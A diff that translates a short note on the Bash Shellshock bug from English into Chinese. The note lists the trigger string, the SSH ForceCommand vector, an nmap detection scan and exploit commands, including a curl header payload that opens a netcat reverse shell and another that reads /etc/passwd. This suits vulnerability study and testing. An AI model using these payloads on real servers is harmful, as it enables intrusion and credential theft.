@@ -1,30 +1,30 @@
 ---
-title: "Test Whether a Server Is Vulnerable to Shellshock Bug"
+title: "測試伺服器是否易受 Shellshock 漏洞影響"
 date: 2022-11-28T15:35:30+08:00
 menu:
   sidebar:
-    name: "Test Whether a Server Is Vulnerable to Shellshock Bug"
+    name: "測試伺服器是否易受 Shellshock 漏洞影響"
     identifier: linux-shell-shellshock-bug
     weight: 10
-tags: ["URL", "Linux", "SHELL", "command line"]
-categories: ["URL", "Linux", "SHELL", "command line"]
+tags: ["Links", "Linux", "SHELL", "command line"]
+categories: ["Links", "Linux", "SHELL", "command line"]
 hero: images/hero/linux.png
 ---
 
-- [Test Whether a Server Is Vulnerable to Shellshock Bug](https://www.baeldung.com/linux/shellshock-bug)
+- [測試伺服器是否易受 Shellshock 漏洞影響](https://www.baeldung.com/linux/shellshock-bug)
 
-##### The Shellshock Bug
+##### Shellshock 漏洞
 
 ```bash
 env x=' () {:;};'
 ```
 
-##### Exploiting Shellshock Bug
+##### 利用 Shellshock 漏洞
 
-- A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.
-- The ignored commands from the user are put in the "SSH_ORIGINAL_COMMAND" environment variable. If the user's default shell is Bash, the Bash shell will parse the value of the "SSH_ORIGINAL_COMMAND" environment variable on start-up and run the embedded commands.
+- 當功能忽略使用者指定的指令，改執行 ForceCommand 的內容時，置換指令就會被執行。
+- 使用者的原始指令會被放在 "SSH_ORIGINAL_COMMAND" 環境變數中。若使用者預設 shell 是 Bash，Bash 在啟動時會解析 "SSH_ORIGINAL_COMMAND" 的值並執行其中的指令。
 
-##### Examples of Shellshock Exploit Commands
+##### Shellshock 利用指令範例
 
 ```bash
 ## 1
@@ -34,7 +34,7 @@ curl -H "X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443" 192
 curl --insecure 192.168.x.x -H "User-Agent: () { :; }; /bin/cat /etc/passwd"
 ```
 
-- use nmap script to test for the vulnerability
+- 使用 nmap 腳本測試漏洞
 
 ```bash
 nmap -sV -p- --script http-shellshock 192.168.x.x
